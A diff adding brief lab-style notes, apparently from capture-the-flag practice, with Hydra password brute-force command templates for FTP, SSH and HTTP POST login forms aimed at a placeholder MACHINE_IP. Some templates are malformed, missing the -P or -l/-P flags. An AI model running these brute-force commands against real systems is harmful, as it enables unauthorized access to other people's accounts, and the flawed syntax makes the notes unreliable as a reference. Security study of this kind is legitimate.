@@ -1,0 +1,21 @@
+HYDRA.
+
+
+
+FTP.
+hydra -l <username> <path passwordlist>.txt ftp://MACHINE_IP
+
+
+
+SSH.
+hydra -l <username> -P <path passwordlist> MACHINE_IP -t <threads number> ssh
+
+
+
+POST WEB FORM.
+Login credentials syntax (where username and password are the fields of input):
+username=^USER^&&password=^PASS^
+Command:
+sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"
+If path is main IP address:
+<path> = /
